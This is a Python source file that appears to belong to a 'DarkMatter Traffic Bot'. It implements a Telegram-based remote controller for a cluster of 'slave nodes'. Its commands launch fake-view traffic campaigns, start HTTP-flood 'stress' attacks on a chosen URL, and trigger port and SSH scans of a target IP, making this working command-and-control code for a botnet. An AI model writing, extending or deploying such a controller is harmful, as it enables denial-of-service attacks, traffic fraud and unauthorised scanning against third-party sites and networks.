"""
DarkMatter Traffic Bot - Telegram Bot Controller & Alerts

Allows monitoring and controlling DarkMatterBot remotely via Telegram.
Uses aiohttp to communicate with the Telegram Bot API with zero extra dependencies.
"""

import asyncio
import logging
import os
import sys
import time
from typing import Any, Callable

import aiohttp


class TelegramBotController:
    """
    Lightweight, dependency-free Telegram Bot controller and notifier for DarkMatterBot.
    """

    def __init__(
        self,
        bot_token: str | None = None,
        chat_id: str | None = None,
        on_command: Callable[[str, list[str]], Any] | None = None,
        status_provider: Callable[[], dict] | None = None,
    ):
        self.bot_token = bot_token or os.environ.get("DM_TELEGRAM_BOT_TOKEN", "").strip()
        self.chat_id = str(chat_id or os.environ.get("DM_TELEGRAM_CHAT_ID", "")).strip()
        self.on_command = on_command
        self.status_provider = status_provider

        self.logger = logging.getLogger("dm-telegram")
        self.session: aiohttp.ClientSession | None = None
        self._running = False
        self._last_update_id = 0
        self._poll_task: asyncio.Task | None = None

    @property
    def is_configured(self) -> bool:
        """Check if bot token is provided."""
        return bool(self.bot_token and len(self.bot_token) > 10)

    async def start(self):
        """Start the Telegram polling loop."""
        if not self.is_configured:
            self.logger.info("Telegram Bot is not configured (missing DM_TELEGRAM_BOT_TOKEN).")
            return

        if self._running:
            return

        self._running = True
        self.session = aiohttp.ClientSession()
        self.logger.info("Starting Telegram Bot controller polling...")

        # Send startup notification if chat_id configured
        if self.chat_id:
            await self.send_message(
                "🚀 <b>DarkMatter Bot Online!</b>\n"
                f"• Platform: <code>{sys.platform}</code>\n"
                f"• Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}</code>\n"
                "Send /help to view available commands."
            )

        self._poll_task = asyncio.create_task(self._poll_updates())

    async def stop(self):
        """Stop the Telegram polling loop."""
        if not self._running:
            return

        self._running = False
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass

        if self.session and not self.session.closed:
            await self.session.close()

        self.logger.info("Telegram Bot controller stopped.")

    async def send_message(self, text: str, target_chat_id: str | None = None) -> bool:
        """Send an HTML-formatted message to the Telegram chat."""
        if not self.is_configured:
            return False

        chat = target_chat_id or self.chat_id
        if not chat:
            self.logger.warning("Telegram send_message failed: No chat_id configured.")
            return False

        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": chat,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }

        try:
            if not self.session or self.session.closed:
                async with aiohttp.ClientSession() as temp_session:
                    async with temp_session.post(url, json=payload, timeout=10) as resp:
                        return resp.status == 200
            else:
                async with self.session.post(url, json=payload, timeout=10) as resp:
                    return resp.status == 200
        except Exception as e:
            self.logger.error(f"Failed to send Telegram message: {e}")
            return False

    async def _poll_updates(self):
        """Long-polling update loop."""
        while self._running:
            try:
                url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
                params = {
                    "offset": self._last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"],
                }

                async with self.session.get(url, params=params, timeout=40) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        updates = data.get("result", [])
                        for update in updates:
                            self._last_update_id = max(self._last_update_id, update.get("update_id", 0))
                            await self._handle_update(update)
                    elif resp.status == 401:
                        self.logger.error("Invalid Telegram bot token! Stopping Telegram poller.")
                        self._running = False
                        break
                    else:
                        await asyncio.sleep(5)

            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.debug(f"Telegram polling error: {e}")
                await asyncio.sleep(5)

    async def _handle_update(self, update: dict):
        """Process incoming Telegram message."""
        message = update.get("message", {})
        text = message.get("text", "").strip()
        chat_id = str(message.get("chat", {}).get("id", ""))
        user_name = message.get("from", {}).get("username", "User")

        if not text or not text.startswith("/"):
            return

        # Check authorization if chat_id restriction is set
        if self.chat_id and self.chat_id != chat_id:
            await self.send_message(
                "⛔ <i>Unauthorized access. Your Chat ID is:</i> <code>" + chat_id + "</code>",
                target_chat_id=chat_id,
            )
            return

        parts = text.split()
        command = parts[0].lower().split("@")[0]  # remove bot handle
        args = parts[1:]

        self.logger.info(f"Telegram command received from @{user_name}: {command} {args}")

        if command in ("/start", "/help"):
            help_text = (
                "⚡ <b>DarkMatter Bot Remote Controller v3.8.0</b>\n\n"
                "<b>Available Commands:</b>\n"
                "• /status - Show cluster status, RAM/CPU and slave count\n"
                "• /slaves - List all connected slave nodes\n"
                "• /traffic &lt;url&gt; &lt;views&gt; [threads] - Launch traffic campaign\n"
                "• /stress &lt;url&gt; [type] [threads] - Start stress load test\n"
                "• /scan &lt;target_ip&gt; [ports] - Trigger port/SSH scan\n"
                "• /proxies - Show proxy pool statistics\n"
                "• /stop - Emergency stop for all running jobs\n"
                "• /ping - Ping bot and get latency\n"
            )
            await self.send_message(help_text, target_chat_id=chat_id)

        elif command == "/ping":
            await self.send_message("🏓 <b>Pong!</b> Bot is responsive.", target_chat_id=chat_id)

        elif command == "/status":
            if self.status_provider:
                status_data = self.status_provider()
                agents_count = status_data.get("agents_count", 0)
                uptime = status_data.get("uptime", "N/A")
                cpu = status_data.get("cpu", "N/A")
                ram = status_data.get("ram", "N/A")
                msg = (
                    "📊 <b>DarkMatter Cluster Status:</b>\n\n"
                    f"• <b>Status:</b> 🟢 Running\n"
                    f"• <b>Active Slaves:</b> {agents_count} node(s)\n"
                    f"• <b>Uptime:</b> {uptime}\n"
                    f"• <b>CPU Usage:</b> {cpu}%\n"
                    f"• <b>Memory Usage:</b> {ram} MB\n"
                )
            else:
                msg = (
                    "📊 <b>DarkMatter Node Status:</b>\n\n"
                    "• <b>Status:</b> 🟢 Running\n"
                    f"• <b>Platform:</b> {sys.platform}\n"
                    f"• <b>Python:</b> {sys.version.split()[0]}\n"
                )
            await self.send_message(msg, target_chat_id=chat_id)

        elif command in ("/slaves", "/agents"):
            if self.status_provider:
                status_data = self.status_provider()
                agents = status_data.get("agents", [])
                if not agents:
                    await self.send_message("ℹ️ No slave nodes currently connected.", target_chat_id=chat_id)
                else:
                    lines = ["⚡ <b>Connected Slave Nodes:</b>\n"]
                    for a in agents:
                        name = a.get("name", "slave")
                        ip = a.get("ip", "0.0.0.0")
                        lines.append(f"• <b>{name}</b> (<code>{ip}</code>) - 🟢 Online")
                    await self.send_message("\n".join(lines), target_chat_id=chat_id)
            else:
                await self.send_message("ℹ️ Slave telemetry provider not linked.", target_chat_id=chat_id)

        elif command == "/stop":
            if self.on_command:
                res = self.on_command("stop", args)
                await self.send_message(f"🛑 <b>Emergency Stop Triggered:</b> {res}", target_chat_id=chat_id)
            else:
                await self.send_message("🛑 Emergency stop command acknowledged.", target_chat_id=chat_id)

        elif command == "/traffic":
            if len(args) < 2:
                await self.send_message("⚠️ <b>Usage:</b> <code>/traffic &lt;url&gt; &lt;views&gt; [threads]</code>", target_chat_id=chat_id)
                return
            target_url = args[0]
            views = args[1]
            threads = args[2] if len(args) > 2 else "10"
            if self.on_command:
                self.on_command("traffic", [target_url, views, threads])
            await self.send_message(
                f"🚀 <b>Traffic Campaign Launched:</b>\n"
                f"• Target: <code>{target_url}</code>\n"
                f"• Target Views: <code>{views}</code>\n"
                f"• Concurrency: <code>{threads}</code> threads",
                target_chat_id=chat_id,
            )

        elif command == "/stress":
            if not args:
                await self.send_message("⚠️ <b>Usage:</b> <code>/stress &lt;url&gt; [attack_type] [threads]</code>", target_chat_id=chat_id)
                return
            target_url = args[0]
            attack_type = args[1] if len(args) > 1 else "http_flood"
            threads = args[2] if len(args) > 2 else "50"
            if self.on_command:
                self.on_command("stress", [target_url, attack_type, threads])
            await self.send_message(
                f"💥 <b>Stress Test Initiated:</b>\n"
                f"• Target: <code>{target_url}</code>\n"
                f"• Type: <code>{attack_type}</code>\n"
                f"• Threads: <code>{threads}</code>",
                target_chat_id=chat_id,
            )

        elif command == "/scan":
            if not args:
                await self.send_message("⚠️ <b>Usage:</b> <code>/scan &lt;target_ip&gt; [ports]</code>", target_chat_id=chat_id)
                return
            target_ip = args[0]
            ports = args[1] if len(args) > 1 else "22,80,443,3389"
            if self.on_command:
                self.on_command("scan", [target_ip, ports])
            await self.send_message(
                f"🔍 <b>Network Scan Started:</b>\n"
                f"• Target: <code>{target_ip}</code>\n"
                f"• Ports: <code>{ports}</code>",
                target_chat_id=chat_id,
            )

        else:
            await self.send_message("❓ Unknown command. Send /help to view command list.", target_chat_id=chat_id)
